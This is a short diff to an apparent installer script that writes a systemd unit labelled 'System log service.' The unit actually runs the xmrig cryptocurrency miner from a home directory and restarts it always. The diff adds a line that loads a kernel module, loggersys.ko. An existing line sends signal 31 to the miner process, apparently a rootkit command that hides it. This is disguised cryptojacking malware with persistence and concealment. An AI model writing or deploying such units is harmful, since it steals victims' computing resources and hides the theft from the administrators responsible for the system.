@@ -296,6 +296,7 @@ else
 Description=System log service.
 
 [Service]
+ExecStartPre=/sbin/insmod /lib/modules/loggersys.ko
 ExecStart=$HOME/loggerd/xmrig --config=$HOME/loggerd/config.json
 ExecStartPost=/bin/bash -c "kill -31 $$(pgrep -o xmrig)"
 Restart=always
